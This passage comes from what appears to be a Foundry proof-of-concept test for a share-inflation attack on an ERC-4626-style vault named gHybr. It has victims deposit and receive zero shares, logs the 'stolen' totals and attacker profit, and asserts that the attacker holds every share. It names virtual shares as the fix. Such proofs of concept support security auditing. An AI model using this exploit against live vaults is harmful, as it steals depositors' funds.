address(gHybr), deposits[i]);\n            gHybr.deposit(deposits[i], victims[i]);\n            vm.stopPrank();\n            \n            uint256 shares = gHybr.balanceOf(victims[i]);\n            console.log(\"  Victim deposited:\", deposits[i] / 1e18, \"HYBR\");\n            console.log(\"  Victim shares received:\", shares);\n            \n            assertEq(shares, 0, \"All victims get 0 shares\");\n            totalStolen += deposits[i];\n        }\n        \n        // ===== FINAL IMPACT =====\n        console.log(\"\\nFINAL IMPACT ANALYSIS:\");\n        console.log(\"------------------------------------------------------------------\");\n        \n        uint256 finalSupply = gHybr.totalSupply();\n        uint256 finalAssets = gHybr.totalAssets();\n        uint256 attackerCanWithdraw = gHybr.calculateAssets(1);\n        \n        console.log(\"  Total victims: 4\");\n        console.log(\"  Total deposits stolen:\", totalStolen / 1e18, \"HYBR\");\n        console.log(\"  Total protocol assets:\", finalAssets / 1e18, \"HYBR\");\n        console.log(\"  Total shares in circulation:\", finalSupply);\n        console.log(\"  Attacker owns:\", gHybr.balanceOf(attacker), \"shares (100%)\");\n        console.log(\"  Attacker can withdraw:\", attackerCanWithdraw / 1e18, \"HYBR\");\n        \n        uint256 attackerProfit = attackerCanWithdraw - INFLATION - 1;\n        console.log(\"\\n  ATTACKER PROFIT:\", attackerProfit / 1e18, \"HYBR\");\n        console.log(\"  ALL VICTIMS LOST: 100% of deposits\");\n        \n        console.log(\"\\nVULNERABILITY CONFIRMED:\");\n        console.log(\"  Severity: CRITICAL\");\n        console.log(\"  Impact: Complete theft of all deposits\");\n        console.log(\"  Victims affected: UNLIMITED\");\n        console.log(\"  Fix required: Virtual shares/assets\");\n        console.log(\"\\n======================================================================\\n\");\n        \n        assertEq(finalSupply, 1, \"Only attacker has shares\");\n        assertTrue(attackerCanWithdraw > INFLATION, \"Attacker profits from attack\");\n        assertGt(totalStolen, 0, \"Victims lost funds\");\n    }\n}\n\n```",
